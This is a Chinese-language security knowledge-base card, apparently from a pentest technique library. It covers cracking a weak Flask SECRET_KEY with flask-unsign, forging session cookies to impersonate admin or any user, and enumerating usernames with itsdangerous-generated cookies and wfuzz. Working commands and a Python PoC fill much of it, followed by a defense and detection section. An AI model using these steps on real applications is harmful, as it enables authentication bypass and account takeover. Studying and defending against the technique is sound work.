---
id: web-python-framework-flask-session-weak-secret-bruteforce-forge-enum
title: Flask 会话签名密钥弱口令爆破与 Cookie 伪造：flask-unsign --unsign/--sign 冒充任意用户并枚举有效用户名
type: scenario
domain: web
path: web/python/framework
technique: flask-session-weak-secret-bruteforce-cookie-forge
aliases:
- flask-unsign 爆破
- Flask session 密钥爆破
- Flask cookie 伪造
- flask-unsign --no-literal-eval
- Flask 用户名枚举
- cookie-session secret123
tags:
- flask
- python
- session
- cookie
- itsdangerous
- weak-secret
- auth-bypass
- user-enumeration
- flask-unsign
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V630
  verified_at: '2026-11-12T23:45:51+08:00'
  notes: '已对照原文与51张图逐张核对：图12 jwt.io 确认 Flask cookie 仅签名（HS256 误识）、图15 flask-unsign --decode 得 {''logged_in'': True, ''username'': ''admin''}；图16 --unsign 因 123456 被 literal 解析成 int 报 FlaskUnsignException；图17 加 --no-literal-eval 后 17920 次命中 b''secret123''；图18 --sign 生成 admin cookie（YxvdIw.PpnxZ3h8WkIo_5JMIfhCDD7hXo8 与原文字节一致）；图19-21 itsdangerous 批量生成候选 cookie + wfuzz --hc 302 枚举出 blue；图22-23 登录 oracle（--hs ''Invalid credential''）命中 admin/blue 并 --sign 伪造 blue cookie；图24 以 blue 进入 dashboard。原理（cookie-session salt、HMAC-SHA1、只签名不加密）、PoC、--no-literal-eval 坑均与原文一致。无 CVE/受影响版本（secret123 为目标环境弱密钥）。dedup：0 duplicate，5 个 related（pickle RCE、D-Tale 硬编码、CBC 无签名、源码泄露伪造等）均非同一密钥获取方式+爆破+枚举链，保留。另核对 skipped 两项 dedup merge：md-to-pdf CVE-2021-23639 根因确由既有 verified 卡 web-nodejs-gray-matter-js-frontmatter-rce 覆盖，MySQL UDF（raptor_udf2/DUMPFILE/CREATE FUNCTION）确由 pentest-privilege-escalation-mysql-udf-dumpfile-root 覆盖，不需新增，needs_extraction=false。未在本机复跑；frontmatter 无 sources/source_url（全库 web 卡惯例）。'
---

## 一句话结论

Flask 默认的客户端 session 是由 itsdangerous `URLSafeTimedSerializer` 用 `SECRET_KEY` 签名的 cookie（salt 固定为 `cookie-session`、HMAC-SHA1）；当应用把 `SECRET_KEY` 配成弱口令时，可用 `flask-unsign --unsign --wordlist ... --no-literal-eval` 离线爆破出密钥，再用 `--sign` 构造任意 `username`/`logged_in` 字段的 cookie，直接冒充 admin 或任意用户登录；同理可批量伪造候选用户名的 cookie（或利用登录响应差异）枚举站点有效用户名。

## 原理

- **Flask session cookie 结构**：`base64url(TaggedJSONSerializer 序列化的 dict).timestamp.HMAC-SHA1 签名`。签名密钥来自 `app.secret_key`，itsdangerous 以 `salt='cookie-session'`、`key_derivation='hmac'`、`digest_method=sha1` 派生签名 key；cookie 只签名不加密，payload 可直接 base64 解码读出。
- **flask-unsign 的工作方式**：`--decode` 按同样 serializer 解码；`--unsign` 对 wordlist 逐条尝试用候选密钥复算签名，与 cookie 中的签名比对，命中即得到 `SECRET_KEY`；`--sign` 用该密钥生成任意 payload 的合法 cookie。
- **数字口令的坑**：wordlist 里的 `123456` 会被 flask-unsign 按 Python literal 解析成 `int`，导致 `FlaskUnsignException: Secret must be a string-type ... received 'int'`；加 `--no-literal-eval` 后按字符串处理，才能继续爆破（本例 17920 次尝试命中 `secret123`）。
- **为什么能冒充用户**：应用信任 cookie 里的 `logged_in`/`username` 字段作为身份（无服务端 session 存储校验）；只要签名合法，服务端就按 cookie 中的 username 加载用户，因此可获得任意用户（含 admin）的会话。
- **用户名枚举两条路**：其一，用 itsdangerous 直接复刻 Flask serializer，对候选用户名字典批量生成 `{'logged_in': True, 'username': <name>}` 的 cookie（比反复启动 flask-unsign 快得多），再用 wfuzz 带 `Cookie: session=FUZZ` 请求登录后页面，按响应码差异（如 302 重定向到 /login vs 200）筛出有效用户；其二，向登录接口提交 `username=FUZZ&password=<固定错误口令>`，过滤掉统一返回 “Invalid credential” 的响应，剩下的即为有效用户名。
- **成立前提**：目标使用 Flask 默认 cookie session 且 `SECRET_KEY` 可被字典命中；若密钥强随机、或应用改用服务端 session（Redis/数据库）并在服务端校验身份，则本路径不成立。

## 触发条件

- 目标为 Flask（或兼容 itsdangerous 签名 cookie）应用，session 存在客户端 cookie 中。
- `SECRET_KEY` 为弱口令、默认值或出现在常见字典中。
- 应用以 cookie 中的 `username`/`logged_in` 等字段直接判定身份。
- 攻击者可访问登录后的页面或登录接口，并能离线运行字典爆破。

## 利用步骤

1. 从浏览器或响应头取得 `session` cookie，`flask-unsign --decode --cookie '<cookie>'` 确认 payload 结构（如 `{'logged_in': True, 'username': 'x123'}`）。
2. `flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval` 爆破签名密钥，得到 `secret123`。
3. `flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'` 生成管理员 cookie，替换浏览器 cookie 后访问 `/dashboard` 验证。
4. 批量枚举：用 itsdangerous 复刻 serializer，对 `names.txt` 每个用户名生成 cookie，`wfuzz -u http://target/dashboard -H "Cookie: session=FUZZ" -w names_cookies --hc 302` 找出有效用户名（如 `blue`）。
5. 或 `wfuzz -u http://target/login -d "username=FUZZ&password=junkpassword" -w names.txt --hs "Invalid credential"` 直接按登录响应差异枚举用户名，再对命中用户 `--sign` 伪造 cookie。
6. 以目标用户身份进入仪表盘/功能页，继续利用导入/导出、VIP 等业务点。

## PoC

```bash
# 1) 解码与爆破（注意 --no-literal-eval 处理数字口令）
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoieDEyMyJ9...'
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoieDEyMyJ9...' \
  --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
# [*] Found secret key after 17920 attempts
# b'secret123'

# 2) 伪造任意用户 cookie
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
```

```python
# 3) 批量生成候选用户名 cookie（wfuzz 的 FUZZ 字典）
import hashlib, sys
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import TimestampSigner, URLSafeTimedSerializer

for name in open(sys.argv[1]):
    cookie = URLSafeTimedSerializer(
        secret_key='secret123', salt='cookie-session',
        serializer=TaggedJSONSerializer(), signer=TimestampSigner,
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})
    print(cookie.dumps({'logged_in': True, 'username': name.strip()}))
```

```bash
# 4) 枚举有效用户
python3 gen_cookies.py names.txt > names_cookies
wfuzz -u http://target/dashboard -H "Cookie: session=FUZZ" -w names_cookies --hc 302
wfuzz -u http://target/login -d "username=FUZZ&password=junkpassword" \
  -w names.txt --hs "Invalid credential"
```

## 变体与关联

- 密钥获取方式变体：源码泄露、路径穿越读配置、硬编码在前端构建产物中的 `SECRET_KEY` 可直接伪造，见 [[web-python-ssti-jinja2-adjacent-literal-flask-session-forge]]、[[web-python-framework-dtale-hardcoded-secret-session-settings-query-rce]]。
- 同类离线爆破：JWT HS256 弱密钥字典爆破后签发任意 token，见 [[web-generic-jwt-weak-hmac-key-bruteforce]]；本质都是 HMAC 密钥弱导致签名可复算。
- 其他 Flask cookie 缺陷：无签名/自行实现的 AES-CBC cookie 位翻转与 None==None 绕过，见 [[web-generic-auth-flask-none-equals-none-cbc-cookie-forgery]]。
- 变体：若密钥强随机但应用存在 SSTI/文件读取，可改为泄露密钥；若改为服务端 session，则需攻击服务端存储或改打会话固定/其他认证缺陷。
- 关联：伪造会话进入后常见后续为文件导出/模板渲染/命令执行（如导出接口接 md-to-pdf），见 [[web-nodejs-gray-matter-js-frontmatter-rce]]。

## 检测与防御

- 防御：`SECRET_KEY` 使用高强度随机值并由环境变量/密钥管理系统注入，禁止默认值、弱口令与硬编码；定期轮换。
- 防御：不要在客户端 session 中存放可决定权限的字段并直接信任；登录后从服务端存储读取用户与权限，或使用服务端 session；设置 `SESSION_COOKIE_HTTPONLY/SECURE/SAMESITE`。
- 检测：短时间内大量携带不同 `session` cookie 的 4xx/302 请求、`/dashboard` 或登录接口的批量用户名探测、cookie 中 username 与登录日志不一致、flask-unsign 类工具特征（固定 payload 结构、异常 UA 可选）。
- 响应：一旦发现弱密钥，立即轮换 `SECRET_KEY`（使所有旧 cookie 失效）、审计相同时段内的异常登录与操作。
